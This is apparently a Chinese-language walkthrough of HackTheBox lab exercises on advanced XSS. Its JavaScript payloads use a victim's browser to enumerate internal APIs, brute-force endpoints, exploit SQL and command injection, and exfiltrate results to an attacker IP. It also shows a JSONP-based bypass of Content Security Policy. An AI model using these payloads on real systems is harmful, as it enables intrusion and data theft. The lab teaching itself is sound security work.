<img alt="Pasted image 20260418154643" src="assets/posts/advanced-xss-csrf/Pasted image 20260418154643.png"/>
<p>正如我们所见，管理端点会从 API 加载额外信息<code>https://api.internal-apis.htb/</code>。但是，如果我们尝试访问该 API，则会被阻止，这表明该 API 只能从受害者的本地网络访问：</p>
<img alt="Pasted image 20260418154701" src="assets/posts/advanced-xss-csrf/Pasted image 20260418154701.png"/>
<p>因此，我们必须调整 XSS 有效载荷，以便枚举受害者浏览器中的 API。</p>
<p><strong>枚举内部API</strong> 首先，我们来提取管理员端点中泄露的端点<code>/v1/sessions</code>。我们可以通过相应地调整 XSS 有效载荷来实现这一点：</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://api.internal-apis.htb/v1/sessions', true);
xhr.withCredentials = true;
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send();</code></pre>
<p>更新有效载荷并等待一段时间后，我们没有收到有关数据泄露服务器的更多数据，这表明出了问题。</p>
<p>由于我们与不同源的 API 通信，同源策略会阻止我们访问响应，除非 API 实现了相应的 CORS 标头来绕过同源策略。由于管理端点从 API 跨域获取数据，我们可以假设 API 已配置 CORS，允许我们访问响应。但是，如果我们更仔细地分析获取数据的客户端 JavaScript 代码，我们会发现对函数的调用<code>fetch</code>没有<code>credentials: 'include'</code>设置 CORS 属性。另一方面，我们<code>withCredentials</code>在有效负载中显式地设置了该属性。如果 API 没有通过设置<code>Access-Control-Allow-Credentials</code>CORS 标头来允许这种做法，则无法绕过同源策略，并会抛出 CORS 错误，从而阻止我们访问响应。为了绕过这个问题，我们需要匹配泄露的调用中设置的参数<code>fetch</code>，并在不提供凭据的情况下发送请求：</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://api.internal-apis.htb/v1/sessions', true);
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send();</code></pre>
<p>这表明我们需要完全匹配内部 API 所期望的配置，以避免 CORS 问题。由于我们无法直接访问 API，因此无法通过识别响应中设置的 CORS 标头来分析 CORS 配置，我们需要从泄露的 HTML 代码中复制配置，该代码实现了与内部 API 的通信。CORS 错误会阻止后续语句的执行。因此，建议使用一个<code>try-catch</code>代码块来识别正确的 CORS 配置，以便导出响应，从而更轻松地调试有效负载（请注意，<code>async</code>调用中的参数<code>xhr.open</code>设置为<code>false</code>）：</p>
<pre><code class="language-js">try {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://api.internal-apis.htb/v1/sessions', false);
    xhr.withCredentials = true;
    xhr.send();
    var msg = xhr.responseText;
} catch (error) {
    var msg = error;
}

var exfil = new XMLHttpRequest();
exfil.open("POST", "https://10.10.15.156:4443/log", true);
exfil.setRequestHeader("Content-Type", "application/json");
exfil.send(JSON.stringify({data: btoa(msg)}));</code></pre>
<p>这将导致以下信息被泄露，表明我们的 HTTP 请求出现了问题，从而使我们能够调整请求的配置以匹配 CORS 配置：</p>
<pre><code class="language-txt">NetworkError: Failed to execute 'send' on 'XMLHttpRequest': Failed to load 'https://api.internal-apis.htb/v1/sessions'.</code></pre>
<p>此外，内部 API 可能需要使用身份验证持有者而非 Cookie 进行身份验证。我们可以使用<a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage" rel="noreferrer" target="_blank">localStorage</a>属性访问存储在受害者本地存储中的身份验证持有者（在存在漏洞的 Web 应用程序上下文中）。然后，我们可以使用<a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/setRequestHeader" rel="noreferrer" target="_blank">setRequestHeader</a><code>Authorization</code>函数设置请求头。<code>XMLHttpRequest</code></p>
<blockquote><strong>注意：</strong> 如果您没有收到预期的数据，请记住可能是 CORS 配置存在问题或缺少身份验证。</blockquote>
<p>经过适当修改以避免 CORS 错误后，我们收到了来自外泄服务器的数据，然后我们可以对其进行解码：</p>
<pre><code class="language-shell">Chenduoduo@htb[/htb]$ echo -n eyJzZXNzaW9ucyI6W3siYWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTA5LjAuNTQxNC4xMjAgU2FmYXJpLzUzNy4zNiIsInRpbWUiOiIxNjkxNjQ1NzMxIiwidXNlciI6ImFkbWluIn0seyJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMDkuMC41NDE0LjEyMCBTYWZhcmkvNTM3LjM2IiwidGltZSI6IjE2OTI1OTYxMzEiLCJ1c2VyIjoiYWRtaW4ifSx7ImFnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwOS4wLjU0MTQuMTIwIFNhZmFyaS81MzcuMzYiLCJ0aW1lIjoiMTY5MzIwMDkzMSIsInVzZXIiOiJhZG1pbiJ9XX0K | base64 -d | jq

{
  "sessions": [
    {
      "agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36",
      "time": "1691645731",
      "user": "admin"
    },
    {
      "agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36",
      "time": "1692596131",
      "user": "admin"
    },
    {
      "agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36",
      "time": "1693200931",
      "user": "admin"
    }
  ]
}</code></pre>
<p>由于数据中不包含任何有价值的信息，我们进一步枚举 API 以识别其他端点。我们可以通过在 XSS 有效载荷中实现目录暴力破解来识别其他端点，该破解会将所有现有端点泄露到泄露服务器。我们将基于<a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/api/objects-lowercase.txt" rel="noreferrer" target="_blank">objects-lowercase.txt</a>字典进行概念验证<code>SecLists</code>。有效载荷将向每个端点发送请求，然后通过检查状态码来确定端点是否有效。我们可以使用类似于以下的有效载荷来实现这一点：</p>
<pre><code class="language-js">var endpoints = ['access-token','account','accounts','amount','balance','balances','bar','baz','bio','bios','category','channel','chart','circular','company','content','contract','coordinate','credentials','creds','custom','customer','customers','details','dir','directory','dob','email','employee','event','favorite','feed','foo','form','github','gmail','group','history','image','info','item','job','link','links','location','log','login','logins','logs','map','member','members','messages','money','my','name','names','news','option','options','pass','password','passwords','phone','picture','pin','post','prod','production','profile','profiles','publication','record','sale','sales','set','setting','settings','setup','site','test','theme','token','tokens','twitter','union','url','user','username','users','vendor','vendors','version','website','work','yahoo'];

for (i in endpoints){
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', \`https://api.internal-apis.htb/v1/\${endpoints[i]}\`, false);
        xhr.send();
        
        if (xhr.status != 404){
            var exfil = new XMLHttpRequest();
            exfil.open("POST", "https://10.10.15.156:4443/log", true);
            exfil.setRequestHeader("Content-Type", "application/json");
            exfil.send(JSON.stringify({data: btoa(endpoints[i])}));
        }
    } catch {
        // do nothing
    }
}</code></pre>
<p>这会将现有的 API 端点泄露到泄露服务器，然后我们可以对其进行进一步分析：</p>
<pre><code class="language-shell">Chenduoduo@htb[/htb]$ python3 server.py 

Serving HTTPS on 0.0.0.0 port 4443 (https://0.0.0.0:4443/) ...
10.129.136.40 - - [30/Nov/2025 13:06:44] "OPTIONS /log HTTP/1.1" 200 -
10.129.136.40 - - [30/Nov/2025 13:06:44] [i] POST body: {"data":"YWNjb3VudHM="}</code></pre>
<p>泄漏出来的API 端点为:<code>users</code>. 然后更新payload:</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://api.internal-apis.htb/v1/users', true);
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send();</code></pre>
<h2>利用内部 Web 应用程序（一）</h2>
<p><strong>识别漏洞</strong></p>
<p>我们将从前几节中使用的相同的 XSS 攻击载荷和<code>/admin.php</code>端点数据外泄开始。这里我们将省略这部分内容，因为我们已经在前几节中讨论过相应的攻击载荷。 当受害者触发 XSS 漏洞时，响应会被泄露到泄露服务器。我们可以看到，管理端点包含对内部 Web 应用程序的引用<code>https://internal.internal-webapps-1.htb</code>：</p>
<img alt="Pasted image 20260418161718" src="assets/posts/advanced-xss-csrf/Pasted image 20260418161718.png"/>
<p>如果我们尝试直接访问该页面，则会被阻止：</p>
<img alt="Pasted image 20260418161726" src="assets/posts/advanced-xss-csrf/Pasted image 20260418161726.png"/>
<p>因此，让我们利用 XSS 漏洞枚举 Web 应用程序，就像我们在上一节中对内部 API 所做的那样。我们将首先提取 Web 应用程序的索引：</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://internal.internal-webapps-1.htb/', false);
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.14.144:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send();</code></pre>
<p>结果显示，内部 Web 应用程序受到身份验证保护，因为索引包含一个登录表单：</p>
<img alt="Pasted image 20260418161829" src="assets/posts/advanced-xss-csrf/Pasted image 20260418161829.png"/>
<p>XSS漏洞允许我们与内部Web应用程序进行完全交互。我们可以尝试使用默认密码或暴力破解其他端点。但是，本节将重点介绍SQL注入漏洞。我们可以从登录表单构造一个有效的登录POST请求，该请求会被内部Web应用程序接受。让我们尝试一个简单的SQL注入，发送一个包含单引号的用户名：</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
var params = \`uname=\${encodeURIComponent("'test")}&amp;pass=x\`;
xhr.open('POST', 'https://internal.internal-webapps-1.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.14.144:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send(params);</code></pre>
<p>这导致出现以下响应，证实内部 Web 应用程序存在 SQL 注入漏洞：</p>
<pre><code class="language-html">HTTP 500 - SQL Error</code></pre>
<p><strong>利用漏洞</strong> 我们将利用 SQL 注入漏洞绕过登录，提取数据库内容。</p>
<p>我们将首先绕过身份验证，这可以通过用户名来实现<code>' OR '1'='1'-- -</code>：</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
var params = \`uname=\${encodeURIComponent("' OR '1'='1' -- -")}&amp;pass=x\`;
xhr.open('POST', 'https://internal.internal-webapps-1.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send(params);</code></pre>
<p>登录后屏幕上会显示以下信息：</p>
<pre><code>(1, 'admin', 'InternalAdmin2023!', 'This is the default admin account.')</code></pre>
<p>数据似乎包含用户名、密码和账户描述。让我们通过导出整个用户表来确认这一点。我们可以像检测其他 SQL 注入漏洞一样，通过枚举常见的有效载荷来检测数据库系统。在本例中，我们处理的是一个<code>SQLite</code>数据库。由于输出中似乎有四列，我们可以使用以下有效载荷导出所有表：</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
var params = \`uname=\${encodeURIComponent("' UNION SELECT 1,2,3,group_concat(tbl_name) FROM sqlite_master-- -")}&amp;pass=x\`;
xhr.open('POST', 'https://internal.internal-webapps-1.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send(params);</code></pre>
<p>随后，我们可以导出该表的模式<code>users</code>：</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
var params = \`uname=\${encodeURIComponent("' UNION SELECT 1,2,3,group_concat(sql) FROM sqlite_master WHERE name='users'-- -")}&amp;pass=x\`;
xhr.open('POST', 'https://internal.internal-webapps-1.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.14.144:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send(params);</code></pre>
<p>由此揭示了以下数据库架构：</p>
<pre><code class="language-sql">CREATE TABLE \`users\` (
    \`id\` int(11) NOT NULL,
    \`username\` varchar(256) NOT NULL,
    \`password\` longtext NOT NULL,
    \`info\` longtext NOT NULL
)</code></pre>
<p>最后，我们可以使用以下有效负载迭代地导出用户表：</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
var params = \`uname=\${encodeURIComponent("' UNION SELECT id,username,password,info FROM users-- -")}&amp;pass=x\`;
xhr.open('POST', 'https://internal.internal-webapps-1.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send(params);</code></pre>
<p>表名有：users, <code>secretdata</code></p>
<pre><code>var xhr = new XMLHttpRequest();
var params = \`uname=\${encodeURIComponent("' UNION SELECT 1,2,3,group_concat(name) FROM pragma_table_info('secretdata')-- -")}&amp;pass=x\`;
xhr.open('POST', 'https://internal.internal-webapps-1.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send(params);</code></pre>
<p><code>secretdata</code> 表里的 <code>data</code> 和<code>id</code>。</p>
<pre><code>var xhr = new XMLHttpRequest();
var params = \`uname=\${encodeURIComponent("' UNION SELECT 1,2,3,group_concat(id||':'||data) FROM secretdata-- -")}&amp;pass=x\`;
xhr.open('POST', 'https://internal.internal-webapps-1.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send(params);</code></pre>
<h2>利用内部 Web 应用程序（二）</h2>
<p><strong>识别漏洞</strong> 识别过程与上一节讨论的过程基本相同。我们将使用相同的 XSS 基础有效载荷，并且管理端点包含对另一个内部 Web 应用程序的引用<code>https://internal.internal-webapps-2.htb</code>。我们可以使用以下有效载荷来窃取该内部 Web 应用程序的索引：</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://internal.internal-webapps-2.htb/', false);
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send();</code></pre>
<p>这将显示以下 HTML 内容，表明我们可以使用该 Web 应用程序来检查不同 Web 应用程序的状态：</p>
<img alt="Pasted image 20260418165934" src="assets/posts/advanced-xss-csrf/Pasted image 20260418165934.png"/>
<p>我们可以通过分析表单来确定 Web 应用程序究竟是如何实现此功能的，从而构建相应的 POST 请求：</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
var params = \`webapp_selector=\${encodeURIComponent("https://internal-webapps-2.htb")}\`;
xhr.open('POST', 'https://internal.internal-webapps-2.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.14.144:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send(params);</code></pre>
<p>这将导致以下响应：</p>
<pre><code>HTTP/1.1 200 OK</code></pre>
<p>让我们尝试一个不存在的域名，看看能否触发错误信息：</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
var params = \`webapp_selector=\${encodeURIComponent("https://doesnotexist.htb")}\`;
xhr.open('POST', 'https://internal.internal-webapps-2.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.14.144:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send(params);</code></pre>
<p>这将导致以下响应：</p>
<pre><code>curl: (6) Could not resolve host: doesnotexist.htb</code></pre>
<p>如我们所见，状态似乎是通过某种方式获取的<code>curl</code>。如果实现不当或缺乏适当的安全措施，则可能存在命令注入漏洞。我们可以通过向数据泄露服务器注入一条额外的 curl 命令来验证这一点：</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
var params = \`webapp_selector=\${encodeURIComponent("| curl -k https://10.10.15.156:4443?pwn")}\`;
xhr.open('POST', 'https://internal.internal-webapps-2.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send(params);</code></pre>
<p>之后，我们可以在数据泄露服务器上看到预期的请求，从而证实了命令注入漏洞的存在：</p>
<pre><code>Chenduoduo@htb[/htb]$ python3 server.py Serving HTTPS on 0.0.0.0 port 4443 (https://0.0.0.0:4443/) ... 10.129.136.40 - - [30/Nov/2025 13:31:33] "GET /?pwn HTTP/1.1" 200 - 10.129.136.40 - - [30/Nov/2025 13:31:33] "OPTIONS /log HTTP/1.1" 200 - 10.129.136.40 - - [30/Nov/2025 13:31:36] [i] POST body: {"data":"PCFET&lt;SNIP&gt;tbD4="} 10.129.136.40 - - [30/Nov/2025 13:31:36] "POST /log HTTP/1.1" 200 -</code></pre>
<p><strong>漏洞利用</strong> 我们可以在 XSS 攻击载荷中指定命令注入载荷，并将结果泄露到泄露服务器。因此，这种利用方式与其他命令注入漏洞并无二致。例如，我们可以执行以下命令<code>id</code>：</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
var params = \`webapp_selector=\${encodeURIComponent("| id")}\`;
xhr.open('POST', 'https://internal.internal-webapps-2.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send(params);</code></pre>
<p>结果包含在 base64 编码的响应中：</p>
<pre><code>uid=0(root) gid=0(root) groups=0(root)</code></pre>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
var params = \`webapp_selector=\${encodeURIComponent("| cat /* 2&gt;/dev/null | tr '\n' ' '")}\`;
xhr.open('POST', 'https://internal.internal-webapps-2.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send(params);</code></pre>
<h2>内容安全策略 (CSP)</h2>
<p>内容 安全策略 (CSP) 是一种纵深防御的安全措施，它通过限制跨站脚本 (XSS) 漏洞的可利用性来降低其严重性。CSP 在<code>Content-Security-Policy</code>响应头中配置。</p>
<h3>CSP 基础知识</h3>
<p>由多个指令组成。每个指令允许一个或多个值。浏览器会强制执行 CSP，并根据 CSP 阻止资源的加载或执行。本节将讨论一些示例指令。</p>
<p>例如，该 <code>script-src</code> 指令定义了 JavaScript 可以从哪些位置加载和执行；我们可以使用以下策略限制允许加载 JavaScript 代码的域：</p>
<pre><code>Content-Security-Policy: script-src 'self' https://benignsite.htb</code></pre>
<p>此内容安全策略 (CSP) 指示浏览器仅从与页面自身同源的源以及外部源加载 JavaScript <code>https://benignsite.htb</code>。因此，如果攻击者在 XSS 有效载荷中注入以下 JavaScript 代码，受害者的浏览器将不会加载该脚本，因此也不会执行它：</p>
<pre><code>&lt;script src="https://exploitserver.htb/pwn.js"&gt;&lt;/script&gt;</code></pre>
<p>但是，允许加载和执行以下脚本：</p>
<pre><code>&lt;script src="/js/useful.js"&gt;&lt;/script&gt; &lt;script src="https://benignsite.htb/main.js"&gt;&lt;/script&gt;</code></pre>
<p>此外，由于<code>unsafe-inline</code>未指定该值，它会阻止所有内联脚本。因此，以下潜在的 XSS 有效载荷均被阻止，从而不会执行：</p>
<pre><code>&lt;script&gt;alert(1)&lt;/script&gt; &lt;img src=x onerror=alert(1) /&gt; &lt;a href="javascript:alert(1)"&gt;click&lt;/a&gt;</code></pre>
<p>此外，还有其他一些常见指令：</p>
<ul><li><code>style-src</code>样式表的允许来源</li><li><code>img-src</code>允许的图片来源</li><li><code>object-src</code>允许的来源，例如对象<code>&lt;object&gt;</code>或<code>&lt;embed&gt;</code></li><li><code>connect-src</code>允许脚本发出 HTTP 请求的来源。例如，使用<code>XMLHttpRequest</code></li><li><code>default-src</code>：如果未显式设置其他指令，则使用此回退值。例如，如果<code>img-src</code>CSP 中不存在此指令，浏览器将使用此值来处理图像。</li><li><code>frame-ancestors</code>允许来源对页面进行框架嵌入，例如，在 <code>&lt;div&gt; </code>标签内\`<code>&lt;iframe&gt;</code><code>。此指令可用于防止</code><code>Clickjacking</code>\`攻击。</li><li>\`<code>form-action</code>\`表单提交允许的来源</li></ul>
<p>指令的其他值包括：</p>
<pre><code>- \`*\`所有来源均允许
- \`'none'\`不允许任何来源。
- \`*.benignsite.htb\`所有子域名\`benignsite.htb\`均允许访问。
- \`unsafe-inline\`允许行内元素
- \`unsafe-eval\`允许动态代码执行，例如 JavaScript 的\`eval\`函数
- \`sha256-407e1bf4a1472948aa7b15cafa752fcf8e90710833da8a59dd8ef8e7fe56f22d\`允许通过哈希值添加元素
- \`nonce-S0meR4nd0mN0nC3\`允许通过 nonce 添加元素</code></pre>
<p>有关其他 CSP 指令值，请查看此处提供的列表。</p>
<hr/>
<h3>安全 CSP</h3>
<p>尽可能严格地执行内容安全策略 (CSP) 对确保 Web 应用程序的安全至关重要。一个好的方法是从一个严格的基准 CSP 开始，逐步放宽限制，直到 Web 应用程序按预期运行。一个好的基准 CSP 如下：</p>
<pre><code>Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; frame-ancestors 'self'; form-action 'self';</code></pre>
<p>此内容安全策略 (CSP) 仅允许从同一源加载图像、样式表和脚本。它还仅允许 JavaScript 向同一源发送 HTTP 请求和表单提交，仅允许同一源的资源嵌入网页，并阻止加载任何其他资源。如果使用任何外部资源，则必须相应地调整此 CSP。</p>
<p>此外，必须移除 Web 应用程序使用的内联 JavaScript 代码，以防止其被阻止。这可以通过将其移动到脚本文件并加载来轻松实现。例如，考虑以下内联 JavaScript 代码：</p>
<pre><code>&lt;script&gt; var poc = "test"; function submitForm(){     console.log(poc); } &lt;/script&gt; &lt;button id="submit" onclick="submitForm()"&gt;</code></pre>
<p><code>test.js</code>提供的代码在功能上与创建包含以下内容的文件完全相同：</p>
<pre><code>var poc = "test"; function submitForm(){     console.log(poc); } document.getElementById("submit").addEventListener('click', submitForm);</code></pre>
<p>然后加载脚本：</p>
<pre><code>&lt;script src="/test.js"&gt;&lt;/script&gt;</code></pre>
<p>这样就可以移除所有内联 JavaScript 代码。</p>
<p>我们可以使用现有的在线工具来评估云安全策略 (CSP)，例如Google 提供的CSP 评估工具。有关如何编写安全 CSP 的更多详细信息，请参阅OWASP CSP 速查表。</p>
<h2>绕过弱 CSP</h2>
<hr/>
<p>现在我们已经讨论了 CSP、CSP 指令和 CSP 指令值，接下来让我们讨论如何利用和绕过弱 CSP。</p>
<hr/>
<h3>绕过弱 CSP</h3>
<p>网络安全策略 (CSP) 可以作为一种纵深防御措施，用于防止跨站脚本攻击 (XSS)。然而，即使 Web 应用程序实现了 CSP，也并不意味着它就能自动抵御所有 XSS 攻击。如果 CSP 存在漏洞，攻击者就有可能绕过它。因此，分析 Web 应用程序的 CSP 是否存在潜在的绕过漏洞至关重要。</p>
<p>让我们先来看下面的CSP：</p>
<pre><code>Content-Security-policy: default-src 'none'; img-src 'self'; style-src *; font-src *; script-src 'self' https://*.google.com;</code></pre>
<p>此 CSP 允许从源本身加载图像，从任何位置加载样式和字体，从源本身及其任何子域加载脚本<code>google.com</code>。由于该指令，所有其他资源都无法加载<code>default-src 'none'</code>。</p>
<p>假设我们尝试在 Web 应用程序中注入一个简单的警告弹出窗口作为概念验证：</p>
<pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
<p>由于 CSP 的限制，不会显示警告弹出窗口；取而代之的是，浏览器的 JavaScript 控制台将打印以下错误消息：</p>
<pre><code>Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'self' https://*.google.com". Either the 'unsafe-inline' keyword, a hash ('sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI='), or a nonce ('nonce-...') is required to enable inline execution.</code></pre>
<p>虽然这种防御技术乍看之下似乎很安全，但它可以通过 <a href="https://www.w3schools.com/js/js_json_jsonp.asp" rel="noreferrer" target="_blank">JSONP</a>绕过。JSONP 是一种可以跨不同来源检索数据而不会受到同源策略限制的技术。JSONP 的基本思想是使用<code>script</code>标签来跨来源检索数据，因为标签不受同源策略的限制。例如，假设一个 Web 应用程序<code>https://vulnerablesite.htb</code>想要从端点 <code>&lt;endpoint&gt;</code> 检索数据<code>https://someapi.htb/stats</code>，该端点返回以下 JSON 数据：</p>
<pre><code>{'clicks': 1337}</code></pre>
<p>如果 API 未配置 CORS，则由于同源策略的限制，Web 应用程序无法访问跨域请求的响应。但是，由于脚本标签不受同源策略的限制，Web 应用程序可以通过在其页面上使用以下 HTML 标签来加载数据：</p>
<pre><code>&lt;script src="https://someapi.htb/stats"&gt;&lt;/script&gt;</code></pre>
<p>然而，这本身并不实用，因为 Web 应用程序需要以某种方式处理数据。假设 Web 应用程序实现了一个<code>processData</code>用于此目的的函数。但是，目前没有办法将接收到的数据传递给该函数。这时，JSONP 就派上了用场。如果 API 支持 JSONP，它会读取发送数据的端点上的 GET 参数，并相应地调整响应。该参数通常称为 <code>get_data</code> <code>callback</code>。假设我们调用端点 <code>get_data</code> <code>https://someapi.htb/stats?callback=processData</code>。这将导致 API 发送以下响应：</p>
<pre><code>processData({'clicks': 1337})</code></pre>
<p>现在，Web应用程序可以在其页面上插入以下脚本标签：</p>
<pre><code>&lt;script src="https://someapi.htb/stats?callback=processData"&gt;&lt;/script&gt;</code></pre>
<p>这样一来，就可以对从 API 跨域获取的数据调用 Web 应用程序的<code>processData</code>功能，而不会违反同源策略或需要 CORS。</p>
<p>由于 JSONP 端点允许调用者指定要调用的函数，因此它们可用于动态创建由提供 JSONP 端点的域发送的 JavaScript 代码。因此，JSONP 可用于绕过内容安全策略 (CSP)。Google 提供了多个不同的 JSONP 端点。JSONBee <a href="https://github.com/zigoo0/JSONBee" rel="noreferrer" target="_blank">GitHub</a>代码库列出了许多可用于绕过 CSP 的 JSONP 端点。我们可以使用以下 Google JSONP 端点来绕过上述 CSP：</p>
<pre><code>&lt;script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1);"&gt;&lt;/script&gt;</code></pre>
<p>将此条目发布到留言簿会触发警告弹出窗口，从而绕过内容安全策略 (CSP)：</p>
<p>https://vulnerablesite.htb/view.php</p>
<img alt="Referenced image" src="https://cdn.services-k8s.prod.aws.htb.systems/content/modules/235/xss/xss_csp_1.png"/>
<p>另一个常见的缺陷是假设<code>'self'</code>值本身是安全的。例如，考虑以下 CSP：</p>
<pre><code>Content-Security-policy: default-src 'none'; img-src 'self'; style-src *; script-src 'self';</code></pre>
